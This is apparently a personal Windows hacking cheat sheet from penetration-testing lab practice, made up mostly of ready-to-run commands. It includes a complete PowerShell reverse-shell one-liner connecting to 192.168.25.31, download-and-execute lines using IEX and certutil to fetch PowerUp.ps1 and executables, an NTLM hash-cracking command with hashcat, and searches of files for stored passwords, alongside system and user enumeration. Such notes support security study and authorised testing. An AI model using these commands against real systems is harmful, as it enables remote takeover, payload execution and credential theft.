# WINDOWS HACKING CHEATSHEET

<!--
##################################################################
##################################################################
-->

## System Enumeration

#### Show Patches
`wmic qfe get Caption,Description,HotFixID,InstalledOn`

#### Show Drives
`wmic logicaldisk get caption,Description,providername`

#### Find specific directory
`dir <Folder Name> /AD /s`

#### Find specific file name on system
`dir /a /s /b c:\*flag2.txt`

`dir /b/s *.txt`

`where /r c:\Windows *.exe *.dll`

#### Find Unquoted service paths
`wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`

#### Allow execution of scripts in powershell
`Set-ExecutionPolicy unrestricted`

#### Show execution policy
`Get-ExecutionPolicy -List | Format-table -AutoSize`

<!--
##################################################################
##################################################################
-->

## User Enumeration

#### Show User Privlages
`whoami /priv`

#### Show a Users Group
`whoami /groups`

#### List users in a group
`net localgroup administrtor`

#### Show info on specified user
`net user administrator`

<!--
##################################################################
##################################################################
-->

## Network Enumeration

#### Show Routing table
`route print`

<!--
##################################################################
##################################################################
-->

## Shells

#### Powershell Reverse Shell One Liner
```
$client = New-Object System.Net.Sockets.TCPClient("192.168.25.31",7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

<!--
##################################################################
##################################################################
-->

## Passwords

#### Use cached creds Windows
`runas /u:Administrator cmd.exe /c findstr /si *.txt > C:\Users\offsec\Desktop\text.txt`

#### Cracking Windows Password Hash
_Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::_
_USERNAME:SID:LM(BLANK=aad3b435b51404eeaad3b435b51404ee):NTLM:::_

`hashcat -m 1000 -a 0 -o plain-pass.txt --remove file-with-hash.hash /usr/share/wordlists/rockyou.txt`

#### Find file containing keyword
`findstr /si password *.txt | *.xml | *.xls`

<!--
##################################################################
##################################################################
-->

## Useful Commands

#### Windows spawn cmd and execute command
`cmd.exe /c echo "hello world"`

#### Windows download from web
`IEX(New-Object Net.WebClient).downloadString('http://10.9.3.23/PowerUp.ps1')`

#### Use certutil to download from web
`certutil.exe -urlcache -split -f "http://10.9.3.23/Advanced.exe" Advanced.exe`

#### Windows Powershell download from web
`powershell "IEX(New-Object Net.WebClient).downloadString('http://10.9.3.23/PowerUp.ps1')"`

#### Mount NFS v3
`mount -t nfs -o vers=3 $ip:/dir /mnt/dir`

#### Download via windows CMD
`powershell -c (new-object System.Net.WebClient).DownloadFile('http://192.168.25.31/privesc/accesschk.exe','C:\Users\GitService\Desktop\accesschk.exe')`

#### Search long output
`command |more`